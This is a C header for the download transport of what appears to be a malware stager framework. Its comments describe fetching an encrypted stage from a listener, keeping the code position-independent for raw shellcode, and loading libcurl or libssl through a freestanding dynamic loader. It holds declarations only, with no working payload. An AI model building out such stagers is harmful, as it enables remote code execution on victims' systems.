#ifndef TRANSPORT_H
#define TRANSPORT_H

#include <stddef.h>
#include <stdint.h>

/*
 * Stager transport interface.
 *
 * A transport downloads the encrypted stage blob from a listener and writes it
 * into the caller-provided buffer. Transports are modular so users can plug in
 * their own implementations — for example, one that rides on libcurl or
 * libssl instead of raw sockets.
 *
 * The interface is deliberately two plain functions (not a function-pointer
 * table): the stager must stay position-independent so it can be extracted as
 * raw shellcode, and function pointers stored in data would need relocations.
 *
 * How to add a transport:
 *   1. Create transport_<name>.c and implement the two functions below.
 *   2. Select it at build time with `make TRANSPORT=<name>` (see Makefile).
 *
 * The built-in transports (transport_http.c, transport_tcp.c,
 * transport_udp.c) use raw syscalls and work for every output format,
 * including raw shellcode (.bin). Transports that need a shared library at
 * runtime (e.g. libcurl.so.N, libssl.so.N) work for every format too: the
 * freestanding dynamic loader in dynload.c resolves dlopen/dlsym/dlclose from
 * libc and loads the library without linking against it. See
 * transport_libcurl.c for a complete example.
 *
 * The Makefile only compiles the support modules a transport needs: raw-socket
 * transports pull in net_utils.c, dynamic-library transports pull in
 * dynload.c.
 */

/* Human-readable name of the selected transport (for debug output). */
const char *transport_name(void);

/* Download the stage blob into `buffer` (up to `capacity` bytes).
 * Returns the number of bytes written, or 0 on failure. */
size_t transport_download(const char *host, const char *port, const char *path,
                          void *buffer, size_t capacity, const uint8_t *key);

#endif /* TRANSPORT_H */
